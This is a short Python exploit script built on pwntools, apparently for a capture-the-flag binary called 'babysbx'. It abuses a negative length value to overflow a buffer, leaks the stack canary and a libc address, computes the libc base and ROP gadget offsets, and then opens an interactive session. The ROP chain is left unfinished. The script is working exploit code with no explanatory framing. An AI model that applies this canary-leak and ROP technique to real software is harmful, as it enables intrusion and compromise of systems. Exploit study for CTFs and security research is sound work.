from pwn import *

if __name__ == "__main__":
    io = process('./babysbx')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    hackysize=-0x8000
    def hkread(l,buf):
        io.sendlineafter(b'Choice: ',b'1')
        io.sendlineafter(b'Length: ',str(l).encode())
        io.send(buf)

    def hkwrite():
        io.sendlineafter(b'Choice: ',b'2')

    def hkexit():
        io.sendlineafter(b'Choice: ',b'3')

    hkread(hackysize,b'A'*0x109)
    hkwrite()
    io.read(0x109)
    canary=u64(b'\0'+io.read(7))
    hkread(hackysize,b'A'*0x128)
    hkwrite()
    io.read(0x128)
    libc_start_main = u64(io.read(0x6)+b'\0'*2)
    libc_base = libc_start_main - 0x270b3
    L_pop_rdi = libc_base+0x00026b72
    L_pop_rsi = libc_base+0x00027529
    io.interactive()
